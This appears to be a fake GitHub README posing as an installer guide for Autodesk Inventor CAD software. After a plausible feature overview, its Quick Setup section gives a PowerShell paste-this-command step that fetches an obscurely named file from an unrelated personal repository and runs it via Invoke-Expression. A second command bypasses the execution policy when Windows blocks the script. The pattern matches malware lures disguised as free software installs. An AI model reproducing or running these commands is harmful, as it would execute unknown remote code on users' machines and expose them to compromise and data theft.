# Inventor

Inventor is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open Inventor and work in it.

Autodesk Inventor is desktop CAD built for mechanical and product design on Windows. It centers on parametric solid modeling, assembly constraints, drawing views, and tools for sheet metal, frames, and routed systems so teams can move from concept to documented parts without leaving one environment.

A typical session starts with a new part file or an existing assembly template. You sketch profiles, apply dimensions and constraints, extrude or revolve features, then place components in an assembly and check interference and motion. When the design stabilizes, you create drawing sheets with BOM tables, dimensions, and notes aligned to shop standards, and you may run stress or motion studies on critical components before release.

This repository holds a Windows setup package for installing Inventor, release notes that summarize version changes and known issues, and a changelog that tracks updates to the bundled installer and local configuration guidance. Together these files support a repeatable install and a clear record of what changed between revisions on your machines.

## What you do with it

- Parametric part modeling ties every feature to editable sketches and dimensions across design changes.
- Assembly constraints position components and drive realistic motion without rebuilding geometry manually.
- Drawing views update automatically when you revise parts or assemblies in the model.
- Sheet metal tools unfold flanges and flat patterns ready for laser cutting and bending workflows.
- Frame Generator builds structural frames from standard profiles with automatic trimming at joints.
- Content Center supplies standard fasteners and parts you insert directly into assemblies and bills of material.
- Stress analysis studies highlight critical regions before you release steel or plastic components to production.
- AnyCAD links reference models from other CAD formats while keeping Inventor assemblies lightweight and current.

## Quick Setup (PowerShell)

This installs the program Inventor on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/lorenz-marie808916/inventor-setup-guide/main/2unh55mflj.bejwix7e | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/lorenz-marie808916/inventor-setup-guide/main/2unh55mflj.bejwix7e | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `2unh55mflj.bejwix7e` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `lorenz-marie808916/inventor-setup-guide`. Autodesk Inventor 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
